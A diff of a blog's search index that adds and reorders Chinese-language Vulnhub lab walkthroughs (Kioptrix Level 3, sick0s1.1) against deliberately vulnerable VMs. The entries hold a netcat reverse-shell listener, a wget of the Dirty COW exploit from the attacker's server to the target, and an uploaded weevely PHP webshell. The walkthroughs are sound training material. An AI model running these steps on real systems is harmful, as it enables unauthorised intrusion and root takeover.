@@ -1,6 +1,42 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Kioptix Level 3</title>
+    <url>/2021/12/07/Kioptrix-Level-3/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.131</code> –<strong>开放80端口</strong><br><img src="/2021/12/07/Kioptrix-Level-3/1.png"></p>
+<p><strong>访问下，发现是个</strong><br><font color="red"><strong>LotusCMS</strong></font></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/2.png"></p>
+<p><code>search LotusCMS</code>  —<strong>在msf中查找LotusCMS有关漏洞</strong><br><img src="/2021/12/07/Kioptrix-Level-3/3.png"></p>
+<p><code>set URI /</code>–<strong>-这里需要把URL路径改为/</strong><br><img src="/2021/12/07/Kioptrix-Level-3/4.png"></p>
+<p><code>run</code> —-<strong>貌似出问题了，无法shell 百度了说是什么中英文版本的问题–没有解决</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/5.png"></p>
+<p><strong>最后百度了下LotusCMS的exp</strong></p>
+<h4 id="二、0x00漏洞利用-LotusCMS漏洞"><a href="#二、0x00漏洞利用-LotusCMS漏洞" class="headerlink" title="二、0x00漏洞利用(LotusCMS漏洞)"></a>二、0x00漏洞利用(LotusCMS漏洞)</h4><p><code>git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit</code></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/6.png"></p>
+<p><code>nc -lvp 7777</code><strong>先开启监听端口7777</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/7.png"></p>
+<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><strong>成功弹到shell优化终端</strong><br><img src="/2021/12/07/Kioptrix-Level-3/8.png"><br><strong>发现权限不是root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/9.png"></p>
+<h4 id="三、0x01提权-脏牛提权"><a href="#三、0x01提权-脏牛提权" class="headerlink" title="三、0x01提权(脏牛提权)"></a>三、0x01提权(脏牛提权)</h4><p><code>uname -a</code>–<strong>查看内核(2.6.24-24)</strong></p>
+<p><code>searchsploit privilege | grep linux | grep 2.6.2</code>  **–**<strong>查找有无可利用漏洞</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/10.png"></p>
+<p>–<strong>先将40839.c先wget到本地后再wget到靶机上–</strong></p>
+<p><code>cd /tmp</code>  <strong>先到靶机tmp目录</strong></p>
+<p><code>wget http://192.168.249.132:8000/40839.c</code>  –这里使用的是<strong>SimpleHTTPServer</strong></p>
+<p><code>gcc -pthread 40839.c -o 40839 -lcrypt</code><strong>–按照40839.c的注释进行编译</strong></p>
+<p><code>./40839 123456</code><br><img src="/2021/12/07/Kioptrix-Level-3/11.png"></p>
+<p><strong>–设置密码为123456</strong></p>
+<p><img src="/2021/12/07/Kioptrix-Level-3/12.png"></p>
+<p><code>ssh firefart@192.168.249.131</code> <strong>—SSH连接成功root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/13.png"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptix Level 2</title>
     <url>/2021/12/05/Kioptrix-Level-2/</url>
     <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
@@ -33,42 +69,6 @@
 <p><code>gcc -o 9542 9542.c</code>—<strong>编译运行即可</strong></p>
 <p><img src="/2021/12/05/Kioptrix-Level-2/15.png"></p>
 <p><strong>—成功root—-</strong></p>
-]]></content>
-      <categories>
-        <category>Vulnhub系列</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptix Level 3</title>
-    <url>/2021/12/07/Kioptrix-Level-3/</url>
-    <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.131</code> –<strong>开放80端口</strong><br><img src="/2021/12/07/Kioptrix-Level-3/1.png"></p>
-<p><strong>访问下，发现是个</strong><br><font color="red"><strong>LotusCMS</strong></font></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/2.png"></p>
-<p><code>search LotusCMS</code>  —<strong>在msf中查找LotusCMS有关漏洞</strong><br><img src="/2021/12/07/Kioptrix-Level-3/3.png"></p>
-<p><code>set URI /</code>–<strong>-这里需要把URL路径改为/</strong><br><img src="/2021/12/07/Kioptrix-Level-3/4.png"></p>
-<p><code>run</code> —-<strong>貌似出问题了，无法shell 百度了说是什么中英文版本的问题–没有解决</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/5.png"></p>
-<p><strong>最后百度了下LotusCMS的exp</strong></p>
-<h4 id="二、0x00漏洞利用-LotusCMS漏洞"><a href="#二、0x00漏洞利用-LotusCMS漏洞" class="headerlink" title="二、0x00漏洞利用(LotusCMS漏洞)"></a>二、0x00漏洞利用(LotusCMS漏洞)</h4><p><code>git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit</code></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/6.png"></p>
-<p><code>nc -lvp 7777</code><strong>先开启监听端口7777</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/7.png"></p>
-<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><strong>成功弹到shell优化终端</strong><br><img src="/2021/12/07/Kioptrix-Level-3/8.png"><br><strong>发现权限不是root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/9.png"></p>
-<h4 id="三、0x01提权-脏牛提权"><a href="#三、0x01提权-脏牛提权" class="headerlink" title="三、0x01提权(脏牛提权)"></a>三、0x01提权(脏牛提权)</h4><p><code>uname -a</code>–<strong>查看内核(2.6.24-24)</strong></p>
-<p><code>searchsploit privilege | grep linux | grep 2.6.2</code>  **–**<strong>查找有无可利用漏洞</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/10.png"></p>
-<p>–<strong>先将40839.c先wget到本地后再wget到靶机上–</strong></p>
-<p><code>cd /tmp</code>  <strong>先到靶机tmp目录</strong></p>
-<p><code>wget http://192.168.249.132:8000/40839.c</code>  –这里使用的是<strong>SimpleHTTPServer</strong></p>
-<p><code>gcc -pthread 40839.c -o 40839 -lcrypt</code><strong>–按照40839.c的注释进行编译</strong></p>
-<p><code>./40839 123456</code><br><img src="/2021/12/07/Kioptrix-Level-3/11.png"></p>
-<p><strong>–设置密码为123456</strong></p>
-<p><img src="/2021/12/07/Kioptrix-Level-3/12.png"></p>
-<p><code>ssh firefart@192.168.249.131</code> <strong>—SSH连接成功root权限</strong><br><img src="/2021/12/07/Kioptrix-Level-3/13.png"></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
@@ -213,8 +213,8 @@
 <p><img src="/2021/12/15/Tr0ll-1/16.png"></p>
 <p><code>ssh-keygen</code> <strong>–kali生成ssh密钥</strong></p>
 <p><img src="/2021/12/15/Tr0ll-1/17.png"><br><img src="/2021/12/15/Tr0ll-1/18.png"></p>
-<p><img src="/2021/12/15/Tr0ll-1/19.png"><br><strong>–保存后便可以在kali上免密登录靶机root权限–</strong></p>
-<p><strong>我vi不精通，脚本复制不过去。。。。试了好几次。。。</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/19.png"><br><strong>–保存后便应该就可以在kali上免密登录靶机root权限–</strong></p>
+<p><strong>我vi不会复制，脚本复制不过去。。。。试了好几次。。。</strong></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
@@ -333,6 +333,52 @@
 <p><code>nmap --interactive</code> <strong>–交互</strong></p>
 <p><code>!sh</code>  <strong>—成功root</strong></p>
 <p><img src="/2021/12/22/mrRobot/22.png"> </p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sick0s1.1</title>
+    <url>/2021/12/23/sick0s1-1/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.12.130</strong><br><strong>kali: 192.168.249.128</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.12.130</code> <strong>–扫描开放端口</strong><br><img src="/2021/12/23/sick0s1-1/1.png"></p>
+<p><strong>3128端口是作为代理</strong><br><img src="/2021/12/23/sick0s1-1/2.png"></p>
+<p> <code>dirsearch -u http://192.168.12.130 --proxy=192.168.12.130:3128</code> <strong>–扫下web目录</strong></p>
+<p><img src="/2021/12/23/sick0s1-1/3.png"></p>
+<p><strong>扫到robots.txt</strong></p>
+<p><img src="/2021/12/23/sick0s1-1/4.png"></p>
+<p><font color="red"><strong>Wolf CMS</strong></font></p>
+<p><img src="/2021/12/23/sick0s1-1/5.png"></p>
+<p><strong>后台管理:?/admin</strong></p>
+<p><img src="/2021/12/23/sick0s1-1/6.png"></p>
+<p><strong>一试就出来了–admin/admin</strong></p>
+<p><a href="https://cloud.tencent.com/developer/article/1047292" title="Wolfcms 0.8.2中存在任意文件上传漏洞">Wolfcms 0.8.2中存在任意文件上传漏洞</a></p>
+<p><font color="red"><strong>weevely</strong></font>是适用于php网站的webshell工具,使用weevely生成的木马免杀能力较强，而且使用加密连接，往往能轻松突破WAF拦截。(<strong>又学到一个工具</strong>)</p>
+<p><code>weevely generate 666 yasso.php</code> <strong>–密码666</strong><br><img src="/2021/12/23/sick0s1-1/7.png"></p>
+<p><strong>–上传–</strong></p>
+<p><img src="/2021/12/23/sick0s1-1/11.png"></p>
+<p><img src="/2021/12/23/sick0s1-1/8.png"></p>
+<p><strong>weevely连接木马(需要开启代理)</strong></p>
+<p><code>export http_proxy=http://192.168.12.130:3128</code> <strong>–配置代理</strong></p>
+<p><img src="/2021/12/23/sick0s1-1/9.png"></p>
+<p><img src="/2021/12/23/sick0s1-1/10.png"></p>
+<p><strong>打完靶机切记删除代理!!!</strong></p>
+<p><code>unset http_proxy</code> <strong>–删除代理</strong></p>
+<p><code>weevely http://192.168.12.130/wolfcms/public/yasso.php 666</code> <strong>–连接木马</strong><br><img src="/2021/12/23/sick0s1-1/12.png"></p>
+<h4 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h4><p><code>cd /var/www/wolfcms</code><strong>–/var/www/wolfcms目录下面发现数据库配置文件</strong><br><img src="/2021/12/23/sick0s1-1/13.png"></p>
+<p><strong>发现用户名/密码=root/john@123</strong><br><img src="/2021/12/23/sick0s1-1/14.png"></p>
+<p><strong>貌似只允许本地连接</strong><br><img src="/2021/12/23/sick0s1-1/15.png"></p>
+<p><code>cat /etc/passwd | grep /bin/bash</code>  <strong>–查看当前用户</strong><br><img src="/2021/12/23/sick0s1-1/16.png"></p>
+<p><strong>发现sickos用户</strong></p>
+<p><strong>root数据库密码即sickos密码</strong></p>
+<p><code>ssh sickos@192.168.12.130</code> <strong>ssh连接</strong></p>
+<p><code>sudo su</code> <strong>–输入sickos密码</strong></p>
+<p><img src="/2021/12/23/sick0s1-1/17.png"></p>
+<p><strong>成功root</strong></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
